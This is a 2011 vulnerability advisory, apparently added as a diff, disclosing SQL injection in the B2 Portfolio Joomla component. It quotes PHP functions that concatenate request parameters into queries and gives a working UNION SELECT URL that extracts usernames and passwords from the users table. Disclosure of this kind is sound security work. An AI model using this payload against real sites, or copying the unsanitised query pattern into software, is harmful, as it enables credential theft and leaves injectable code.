@@ -1,0 +1,93 @@
+B2 Portfolio Joomla Component 1.0.0 Multiple SQL Injection Vulnerability
+
+ Name              B2 Portfolio
+ Vendor            http://www.pulseextensions.com
+ Versions Affected 1.0.0
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2011-01-24
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ 
+
+I. ABOUT THE APPLICATION
+________________________
+
+B2 Portfolio is a Joomla component to give the  user  the
+option to view details of a portfolio item by zooming  it
+on hover, and to allow a full view by clicking.
+
+
+II. DESCRIPTION
+_______________
+
+Some parameters are not properly sanitised  before  being
+used in SQL queries.
+
+
+III. ANALYSIS
+_____________
+
+Summary:
+
+ A) Multiple SQL Injection
+ 
+
+A) Multiple SQL Injection
+_________________________
+
+Id  and  wallid  parameters  are  not  properly sanitised
+before being used in SQL queries. This  can  be exploited
+to manipulate SQL queries by injecting arbitrary SQL code.
+
+The following are the vulnerable functions:
+
+function getcategoryname() {
+  $db =& JFactory::getDBO();
+  $default_category = JRequest::getVar('c',  0);
+  if($default_category == "") {
+    $query_cat = 'SELECT default_category FROM #__b2portfolio_config';
+    $db->setQuery( $query_cat );
+    $default_category = $db->loadResult();
+  }
+
+  $query = 'SELECT * FROM #__b2portfolio_category where id='.$default_category;
+  $db->setQuery( $query );
+  $cat_data =  $this->_db->loadObject($query);
+	
+  return $cat_data;
+}
+
+function click() {
+  $db =& JFactory::getDBO();
+  $date =& JFactory::getDate();
+  $trackDate = $date->toFormat( '%Y-%m-%d' );
+
+  $query = 'UPDATE #__b2portfolio set click = ( click + 1 ) where id ='.$_GET['wallid'];
+  $db->setQuery( $query );
+  $db->query();
+}
+
+
+IV. SAMPLE CODE
+_______________
+
+A) Multiple SQL Injection
+
+http://site/path/index.php?option=com_b2portfolio&c=-1 UNION SELECT 1,concat(username,0x34,password),3,4,5 FROM jos_users
+
+
+V. FIX
+______
+
+No fix.
+
+
